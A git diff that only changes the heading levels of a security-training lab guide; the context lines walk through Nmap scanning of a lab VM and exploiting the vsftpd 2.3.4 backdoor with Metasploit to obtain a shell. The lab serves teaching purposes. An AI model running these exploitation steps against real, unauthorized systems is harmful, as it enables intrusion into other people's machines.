@@ -104,7 +104,7 @@ In this lab you will learn the typical workflow of vulnerability scanning and ex
 4. Select an appropriate exploit  
 5. Exploit the system 
 
-## Step 1: Start the Virtual Machines
+### Step 1: Start the Virtual Machines
 
 1. Make sure the network settings are configured as follows:
    - it-security-training:
@@ -120,7 +120,7 @@ In this lab you will learn the typical workflow of vulnerability scanning and ex
    - Username: kali
    - Password: kali
 
-## Step 2: Identify the Target IP Address
+### Step 2: Identify the Target IP Address
 
 Before scanning or attacking, you must know where the target system is located in the network.
 
@@ -149,7 +149,7 @@ Before scanning or attacking, you must know where the target system is located i
     - The target VM 
     Write down the target IP.
 
-## Step 3: Scan the Target with Nmap
+### Step 3: Scan the Target with Nmap
 
 In this step, you will identify all open ports and running services, including their versions.
 
@@ -165,11 +165,11 @@ Explanation:
 
 Review the output carefully and note the discovered services.
 
-## Step 4: Focus on the FTP Service
+### Step 4: Focus on the FTP Service
 
 Identify which FTP service and version is running on the target system.
 
-### Research Known Vulnerabilities
+#### Research Known Vulnerabilities
 
 Search online for known vulnerabilities related to the identified FTP service and version.
 
@@ -179,9 +179,9 @@ Hints:
 
 Write down your findings.
 
-## Step 5: Exploitation with Metasploit
+### Step 5: Exploitation with Metasploit
 
-### Start Metasploit
+#### Start Metasploit
 
 ```bash
 msfconsole
@@ -189,7 +189,7 @@ msfconsole
 
 Wait until Metasploit finishes loading.
 
-### Search for a module
+#### Search for a module
 
 ```text
 search vsftpd
@@ -201,13 +201,13 @@ You should see an entry similar to:
 exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-### Select the exploit
+#### Select the exploit
 
 ```text
 use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
-### View required options
+#### View required options
 
 ```text
 show options
@@ -217,13 +217,13 @@ Relevant options:
 - `RHOSTS` → target IP address
 - `RPORT` → FTP port (default: 21)
 
-### Configure the exploit
+#### Configure the exploit
 
 ```text
 set RHOSTS <target-ip>
 ```
 
-### Execute the Exploit
+#### Execute the Exploit
 
 ```text
 run
@@ -231,7 +231,7 @@ run
 
 If successful, you will receive a shell on the target system.
 
-### Verify Access
+#### Verify Access
 
 Inside the obtained shell:
 
